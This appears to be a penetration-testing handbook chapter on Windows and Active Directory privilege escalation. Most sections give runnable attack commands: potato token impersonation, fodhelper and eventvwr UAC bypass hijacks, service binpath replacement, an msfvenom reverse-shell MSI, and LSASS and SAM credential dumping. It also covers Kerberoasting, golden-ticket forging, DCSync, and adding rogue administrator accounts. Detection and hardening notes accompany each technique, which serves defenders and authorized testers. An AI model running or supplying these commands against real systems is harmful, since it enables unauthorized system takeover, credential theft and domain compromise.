# Windows Privilege Escalation Techniques

> **Privilege Escalation Handbook** — File 04  
> Practical techniques building on concepts in File 03  
> Authorized testing only

---

## Table of Contents

1. [Methodology & Initial Checks](#1-methodology--initial-checks)
2. [Token Impersonation (Potato Family)](#2-token-impersonation-potato-family)
3. [UAC Bypass Methods](#3-uac-bypass-methods)
4. [Service Exploitation](#4-service-exploitation)
5. [Unquoted Service Paths](#5-unquoted-service-paths)
6. [Registry Abuse](#6-registry-abuse)
7. [Scheduled Tasks](#7-scheduled-tasks)
8. [DLL Hijacking](#8-dll-hijacking)
9. [AlwaysInstallElevated](#9-alwaysinstallelevated)
10. [Credential Dumping](#10-credential-dumping)
11. [Other Local Techniques](#11-other-local-techniques)
12. [GPO Misconfigurations](#12-gpo-misconfigurations)
13. [Active Directory Privilege Escalation](#13-active-directory-privilege-escalation)
14. [Detection Notes](#14-detection-notes)
15. [References](#15-references)

---

## 1. Methodology & Initial Checks

### 1.1 First Commands

```cmd
whoami
whoami /all
systeminfo
hostname
ipconfig /all
net user
net localgroup administrators
net localgroup
```

```powershell
Get-ComputerInfo | Select WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer
Get-LocalUser
Get-LocalGroupMember Administrators
```

### 1.2 Automated Assist

```cmd
winPEASx64.exe
# or PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
```

### 1.3 Decision Tree (Short)

```text
Admin group but not elevated? → UAC bypass
SeImpersonate/SeAssignPrimaryToken? → Potato / PrintSpoofer
Weak service/task/file ACL? → Hijack binary/config
AlwaysInstallElevated? → MSI
Domain user? → Kerberoast, AS-REP, ACL, GPO, delegation
Have admin/SYSTEM? → Dump creds, lateral, AD
```

---

## 2. Token Impersonation (Potato Family)

### 2.1 Prerequisites

```cmd
whoami /priv
```

Look for **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege** (often enabled on service accounts).

### 2.2 Concept

1. Attacker creates a trap (named pipe / COM / DCOM / print spooler related).
2. A **SYSTEM** (or privileged) process connects or authenticates to the trap.
3. Attacker **impersonates** the client token.
4. Spawn process as SYSTEM.

### 2.3 PrintSpoofer (Common on Modern Windows)

Works well when SeImpersonate is held and spooler is available.

```cmd
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "C:\Temp\rev.exe"
```

### 2.4 GodPotato / SweetPotato / JuicyPotatoNG

Older JuicyPotato relied on specific CLSID/BITS behaviors; newer Windows versions often need **GodPotato**, **JuicyPotatoNG**, or similar.

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\Windows\System32\cmd.exe"
```

### 2.5 RogueWinRM / Other Variants

Depending on environment (WinRM, BITS, etc.), choose the variant that forces a privileged callback.

### 2.6 Real-World Scenario

IIS app pool compromise → `iis apppool\...` has SeImpersonate → PrintSpoofer → SYSTEM → dump LSASS or add admin user (per ROE).

### 2.7 Detection Notes

- New SYSTEM processes spawned from service account parents
- Spooler / pipe abuse telemetry
- Known potato binary hashes / command lines

> **Pro tip:** After getting SYSTEM via potato, prefer **non-persistent proof** (e.g., `whoami` output file) unless persistence is in scope.

---

## 3. UAC Bypass Methods

### 3.1 When UAC Bypass Applies

- Current user is in **Administrators**
- Process is **Medium integrity** (not elevated)
- Goal: High integrity admin token without user clicking prompt (or abusing auto-elevate)

### 3.2 fodhelper.exe Method

`fodhelper.exe` auto-elevates and launches commands from a user-writable registry key.

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "C:\Temp\payload.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f
fodhelper.exe
```

Clean up registry after.

### 3.3 eventvwr.exe / MSC File Hijack (Historical)

`eventvwr.exe` previously launched `mmc` with hijackable `HKCU\Software\Classes\mscfile\shell\open\command`.

```cmd
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "C:\Temp\payload.exe" /f
eventvwr.exe
```

Patch status varies — verify on target Windows build.

### 3.4 sdclt.exe, computerdefaults.exe, and Others

Multiple auto-elevate binaries have been abused via registry hijacks under `HKCU\Software\Classes\...`. Maintain an updated lab matrix per OS build.

### 3.5 Environment Variable–Based Bypasses

Some chains abuse `windir` or path search with elevated auto-start binaries. EDR often signatures these; still useful in labs.

### 3.6 COM Elevation Moniker / ICMLuaUtil

Programmatic elevation interfaces used by UACME-style tools. Useful when scripting bypasses.

### 3.7 Tools

- **UACME** (research) — many methods, highly signatured
- Custom registry hijacks — quieter if novel

### 3.8 Detection Notes

- fodhelper/eventvwr spawning unusual children
- HKCU class registry modifications followed by auto-elevate binary
- Medium IL process writing then elevating

> **Warning:** UAC bypass does **not** help a pure standard user outside Administrators group.

---

## 4. Service Exploitation

### 4.1 Insecure Service Permissions

If you can change service configuration:

```cmd
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv %USERNAME% *
sc qc VulnerableSvc
sc config VulnerableSvc binpath= "C:\Temp\payload.exe"
sc stop VulnerableSvc
sc start VulnerableSvc
```

PowerUp:

```powershell
Get-ModifiableService
Invoke-ServiceAbuse -Name VulnerableSvc
```

### 4.2 Writable Service Binary

```cmd
icacls "C:\Program Files\VulnApp\service.exe"
# If modify granted:
copy /y C:\Temp\payload.exe "C:\Program Files\VulnApp\service.exe"
sc stop VulnSvc & sc start VulnSvc
```

### 4.3 Writable Service Registry Key

```cmd
accesschk.exe -kvuqsw hklm\System\CurrentControlSet\Services
reg query HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc
reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\payload.exe /f
```

### 4.4 Weak Service Account Creds

Services running as domain users may use crackable or reusable passwords; extract via LSA secrets once elevated, or find in config files pre-elevated.

---

## 5. Unquoted Service Paths

### 5.1 Vulnerability

```text
ImagePath = C:\Program Files\Vulnerable App\service.exe
```

Windows may search:

1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. ... then real path

If an earlier path segment is writable, drop a malicious exe with the right name.

### 5.2 Find Unquoted Paths

```cmd
wmic service get name,pathname,startname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```powershell
Get-CimInstance Win32_Service | Where-Object {
  $_.PathName -notmatch '^"' -and $_.PathName -match ' '
} | Select Name, PathName, StartName
```

### 5.3 Exploit

```cmd
# Example if C:\Program Files\Vulnerable App\ is not writable but C:\ is (rare) or intermediate dir is
copy payload.exe "C:\Program Files\Vulnerable.exe"
# Restart service or reboot if auto-start
```

### 5.4 Detection / Hardening

- Always quote paths with spaces
- Monitor creation of executables in intermediate path segments

---

## 6. Registry Abuse

### 6.1 ImagePath / Service Keys

Covered above — highest impact.

### 6.2 Autoruns Keys with Weak ACLs

If `HKLM\...\Run` is writable by low-priv (rare but critical), payload runs at logon — often as the logging-on user, so elevation depends on who logs on.

### 6.3 IFEO Debugger

```text
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
Debugger = C:\Temp\cmd.exe
```

Sticky Keys abuse at logon screen historically used for persistence/accessibility backdoors — needs write access to IFEO (admin).

### 6.4 AlwaysInstallElevated

See section 9.

### 6.5 Detection Notes

- Registry auditing on Services keys
- Sysmon Event ID 13 (Registry value set) for ImagePath changes

---

## 7. Scheduled Tasks

### 7.1 Enumerate

```cmd
schtasks /query /fo LIST /v
```

```powershell
Get-ScheduledTask | ForEach-Object {
  $i = $_ | Get-ScheduledTaskInfo
  [PSCustomObject]@{
    TaskName = $_.TaskName
    State = $_.State
    User = $_.Principal.UserId
    Actions = ($_.Actions | Out-String)
  }
}
```

### 7.2 Writable Script Run as SYSTEM

If task runs `C:\Scripts\backup.ps1` as SYSTEM and you can edit it:

```powershell
Add-Content C:\Scripts\backup.ps1 'net user pwned Password123! /add'
Add-Content C:\Scripts\backup.ps1 'net localgroup administrators pwned /add'
```

(Use engagement-approved payloads.)

### 7.3 Weak Task Folder ACLs

`C:\Windows\System32\Tasks` normally restricted; custom task folders under user-writable paths are riskier.

### 7.4 Detection Notes

- Task XML modifications
- Unexpected SYSTEM tasks spawning cmd/powershell

---

## 8. DLL Hijacking

### 8.1 Concept

Privileged process loads DLL from writable directory due to:

- Missing DLL in application folder
- Insecure **DLL search order**
- `%PATH%` hijacking
- Phantom DLL (application looks for non-existing optional DLL)

### 8.2 Discovery

```cmd
# Sysinternals
procmon.exe  # Filter: Result is NAME NOT FOUND, Path ends with .dll
```

PowerUp:

```powershell
Find-ProcessDLLHijack
Find-PathDLLHijack
```

### 8.3 Plant DLL

Compile proxy DLL or simple `DllMain` payload; place where search order finds it before the real location; restart service/app.

### 8.4 Detection Notes

- Unsigned DLLs loaded by SYSTEM processes
- DLL loads from user-writable paths (`Temp`, `Downloads`, `Public`)

---

## 9. AlwaysInstallElevated

### 9.1 Check

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both must be `0x1`.

### 9.2 Exploit

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST= tun0 LPORT=443 -f msi -o setup.msi
msiexec /quiet /qn /i setup.msi
```

Or use a custom MSI that runs a command as SYSTEM.

### 9.3 Detection Notes

- Rare legitimate need for AlwaysInstallElevated
- msiexec spawning shells

---

## 10. Credential Dumping

> Credential dumping is **credential access** that enables escalation and lateral movement. Only on authorized hosts; prefer OPSEC-aware methods scoped by ROE.

### 10.1 LSASS Memory

**Mimikatz** (highly signatured):

```text
privilege::debug
sekurlsa::logonpasswords
sekurlsa::ekeys
```

**Modern approaches:**

- Comsvcs.dll MiniDump (living off the land)
- Nanodump / custom dumpers
- SSP / read-only techniques depending on EDR

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full
```

Parse offline with Mimikatz or pypykatz:

```bash
pypykatz lsa minidump lsass.dmp
```

### 10.2 SAM / SYSTEM / SECURITY Hives

```cmd
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
reg save HKLM\SECURITY C:\Temp\security.save
```

Offline:

```bash
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

### 10.3 Mimikatz LSA Secrets / Cache

```text
lsadump::sam
lsadump::secrets
lsadump::cache
```

### 10.4 DPAPI / Browser / Credential Manager

```cmd
cmdkey /list
```

Mimikatz DPAPI modules / SharpDPAPI for masterkeys and vaults.

### 10.5 Token Privileges Needed

- Typically admin/SYSTEM or **SeDebugPrivilege** for LSASS
- **SeBackupPrivilege** can help file-based approaches

### 10.6 Detection Notes

- LSASS access (Sysmon 10)
- Suspicious handles to lsass.exe
- Credential Guard / RunAsPPL mitigations
- Mimikatz strings and well-known dump tools

---

## 11. Other Local Techniques

### 11.1 AlwaysInstallElevated — covered

### 11.2 Fragile Path / Startup Folders

Writable startup folders for other users rarely elevate unless that user is admin and executes — more persistence/lateral.

### 11.3 Driver Exploitation

Bring Your Own Vulnerable Driver (BYOVD) to disable PPL or gain kernel — advanced red team; high detection.

### 11.4 Backup Operators

Members can read sensitive files via backup APIs → SAM or NTDS paths on DCs with additional steps.

```cmd
whoami /groups | findstr /i Backup
```

### 11.5 SeBackup / SeRestore Abuse

Tools like `Robocopy /b` or specialized utilities to copy protected files.

### 11.6 Sticky Keys / Utilman (Already Admin)

Replace `sethc.exe` / `utilman.exe` with `cmd.exe` for console at logon — persistence more than initial privesc.

### 11.7 Kernel Exploits

Version-specific; treat like Linux — stability and patch level critical.

---

## 12. GPO Misconfigurations

### 12.1 Find Writable GPOs

```powershell
# With appropriate domain tools / BloodHound
# SharpGPOAbuse, Group3r, etc.
```

BloodHound edges: **GenericWrite/Edit** on GPO, **GPO to OU** links.

### 12.2 Abuse Patterns

- Immediate scheduled task as SYSTEM on computers in OU
- Add local admin via Restricted Groups
- Deploy malicious MSI via software installation
- Abuse scripts in `Machine\Scripts\Startup`

### 12.3 SharpGPOAbuse Example (Conceptual)

```cmd
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net localgroup administrators domain\\user /add" --GPOName "Vulnerable GPO"
```

### 12.4 Detection Notes

- GPO modification events
- New scheduled tasks from GP across many hosts
- BloodHound hardening: remove unnecessary GPO ACLs

---

## 13. Active Directory Privilege Escalation

### 13.1 Kerberoasting

**Goal:** Request TGS for accounts with SPNs; crack offline to get service account password.

```bash
impacket-GetUserSPNs domain/user:Password -dc-ip 10.10.10.10 -request
```

```powershell
# Rubeus
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /outfile:hashes.txt
```

Crack:

```bash
hashcat -m 13100 hashes.txt rockyou.txt
```

**Impact:** If service account is over-privileged (domain admin — sadly common), domain compromise.

### 13.2 AS-REP Roasting

Accounts with **Do not require Kerberos preauthentication**.

```bash
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat
```

```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

```bash
hashcat -m 18200 asrep.txt rockyou.txt
```

### 13.3 Golden Ticket

Requires **KRBTGT** hash (usually via DCSync as high priv).

```text
# Mimikatz
kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt
```

```bash
impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-... -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
```

Forged TGT → impersonate any user for extended period until krbtgt rotation.

### 13.4 Silver Ticket

Forge TGS for a **specific service** with that service account’s hash (no krbtgt needed).

### 13.5 DCSync

Rights: `Replicating Directory Changes` / `All` on domain.

```bash
impacket-secretsdump domain/user:pass@dc
```

```text
lsadump::dcsync /domain:corp.local /user:krbtgt
```

### 13.6 Unconstrained / Constrained / RBCD Delegation

| Type | Abuse summary |
|------|----------------|
| Unconstrained | Compromise host → steal TGTs of connectors |
| Constrained | S4U tricks to impersonate to allowed SPNs |
| RBCD | Write msDS-AllowedToActOnBehalfOfOtherIdentity → impersonate to resource |

```bash
impacket-getST -spn host/target.domain.local -impersonate Administrator -dc-ip ... domain/attacker\$:pass
```

### 13.7 ACL-Based Takeovers

BloodHound paths:

- GenericAll on user/group/computer
- ForceChangePassword
- AddMember to privileged groups
- WriteOwner / WriteDacl
- DCSync ACE

```bash
# Example password reset with rights
net rpc password 'targetuser' 'NewPass123!' -U 'domain'/'attacker'%'pass' -S dc
```

### 13.8 Domain Trust Attacks

- SID History filtering gaps
- Trust ticket forging (inter-realm)
- Forest compromise patterns

### 13.9 Real-World Scenario Chain

1. Phish → domain user shell on workstation  
2. Kerberoast → crack `svc_sql`  
3. `svc_sql` has GenericAll on target computer object  
4. RBCD → impersonate DA to host  
5. DCSync → enterprise compromise  

---

## 14. Detection Notes

| Technique | Blue team focus |
|-----------|-----------------|
| Potato | SYSTEM child of web/sql service; pipe events |
| UAC bypass | Auto-elevate binaries + HKCU class writes |
| Service hijack | Service ImagePath change; binary hash change |
| Unquoted path | Exe creation in odd intermediate paths |
| DLL hijack | Loads from Temp/user dirs |
| LSASS dump | Sysmon 10; Credential Guard |
| Kerberoast | Unusual TGS volume for many SPNs |
| Golden Ticket | Anomalous TGT lifetime / embedding; krbtgt rotation |
| DCSync | Replication from non-DC |

Hardening highlights:

- No standing local admin for users  
- Remove SeImpersonate from unnecessary accounts where possible (careful)  
- Quote service paths; harden ACLs  
- Disable AlwaysInstallElevated  
- Managed service accounts; no weak SPN user passwords  
- Enable PAC validation, modern Kerberos hardening  
- Rotate krbtgt twice after suspected golden ticket  

---

## 15. References

- [HackTricks — Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings — Windows Priv Esc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [LOLBAS](https://lolbas-project.github.io/)
- [MITRE ATT&CK T1134](https://attack.mitre.org/techniques/T1134/) Access Token Manipulation  
- [MITRE ATT&CK T1548.002](https://attack.mitre.org/techniques/T1548/002/) UAC Bypass  
- [MITRE ATT&CK T1558](https://attack.mitre.org/techniques/T1558/) Steal or Forge Kerberos Tickets  
- [SpecterOps BloodHound docs](https://bloodhound.readthedocs.io/)  
- [Impacket](https://github.com/fortra/impacket)  
- [PEASS-ng WinPEAS](https://github.com/peass-ng/PEASS-ng)

---

## Appendix A: PowerUp Quick Map

| Check | Technique |
|-------|-----------|
| `Get-ModifiableService` | Service config abuse |
| `Get-UnquotedService` | Unquoted paths |
| `Get-ModifiableServiceFile` | Binary replace |
| `Get-RegistryAlwaysInstallElevated` | MSI privesc |
| `Find-ProcessDLLHijack` | DLL hijack |

## Appendix B: engagment OPSEC Reminders

- Prefer built-in tools when EDR is sensitive  
- Avoid adding users if ROE forbids persistence  
- Document every privilege change for cleanup  
- Golden tickets require careful cleanup (krbtgt reset)  

## Appendix C: Lab Checklist

- [ ] SeImpersonate → SYSTEM  
- [ ] Admin medium IL → UAC bypass → High  
- [ ] Weak service → SYSTEM  
- [ ] Unquoted path lab  
- [ ] AlwaysInstallElevated lab  
- [ ] Kerberoast + crack  
- [ ] AS-REP roast  
- [ ] BloodHound ACL path to DA  

---

*End of File 04 — Windows Privilege Escalation Techniques*  
*Related: File 03 (concepts), File 05 (shells), File 07 (tools), File 08 (evasion)*
